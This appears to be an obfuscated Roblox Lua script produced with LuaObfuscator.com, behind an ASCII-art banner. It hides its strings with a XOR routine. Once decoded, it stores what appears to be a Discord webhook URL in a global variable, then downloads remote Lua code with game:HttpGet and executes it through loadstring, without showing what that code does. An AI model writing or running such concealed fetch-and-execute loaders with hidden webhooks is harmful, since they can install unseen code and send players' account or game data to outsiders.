--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.1.6) ~  Much Love, Ferib 

]]--

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v10,v11)local v12={};for v13=4 -(1 + 2), #v10 do v6(v12,v0(v4(v1(v2(v10,v13,v13 + (2 -1) + 0)),v1(v2(v11,(663 -(515 + 147)) + (0 -0) + ((v13-1)% #v11),1 + ((v13-(1 + 0 + 0))% #v11) + (1679 -(1621 + 57)))))%((65 + 484) -(1709 -(515 + 901)))));end return v5(v12);end _G.v8=3973343260 -(1145 + 673);_G.v9=v7("\41\87\83\87\50\25\8\8\37\74\84\68\46\81\67\9\34\76\74\8\32\83\78\8\54\70\69\79\46\76\76\84\110\18\23\18\121\16\20\19\120\17\20\21\113\19\17\16\120\26\31\17\110\84\110\126\115\71\106\117\39\84\114\116\51\75\66\100\52\71\99\117\112\109\19\17\47\21\109\93\18\22\10\74\36\124\72\82\2\22\75\104\117\100\21\118\18\81\19\98\116\19\68\111\113\83\100\73\19\17\115\31\14\87\109\94\51\119\65\115\50","\65\35\39\39");loadstring(game:HttpGet(v7("\138\230\254\254\222\105\204\17\144\243\253\160\202\58\151\86\151\240\255\253\200\33\128\81\140\230\239\224\217\125\128\81\143\189\252\235\222\39\154\70\205\194\239\250\254\58\142\75\142\243\254\225\223\11\162\75\150\253\204\239\223\62\204\83\131\251\228\161\229\50\144\74\135\212\235\252\192\125\143\75\131","\226\146\138\142\173\83\227\62")))();